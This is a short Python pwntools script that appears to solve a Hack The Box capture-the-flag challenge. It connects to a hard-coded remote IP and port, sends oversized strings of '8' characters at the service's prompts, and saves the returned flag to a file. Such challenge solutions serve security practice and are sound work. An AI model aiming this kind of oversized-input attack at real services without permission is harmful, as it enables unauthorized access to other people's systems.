#!/usr/bin/python3
from pwn import *
from re import findall

#debug_level = "critical"
context.log_level = 'error'

io = connect("206.189.117.93", 31701)

io.sendlineafter(">> ", "8888888888888888888888888888".encode())
io.sendlineafter(">> ", "8888888888888888888888888888".encode())
io.sendlineafter(">> ", "8".encode())
io.sendlineafter(">> ", "8".encode())

flag = findall("HTB{.*}", io.recv().decode())[0]

with open("flag.txt", 'w+') as f:
	f.write(flag)

print(flag)

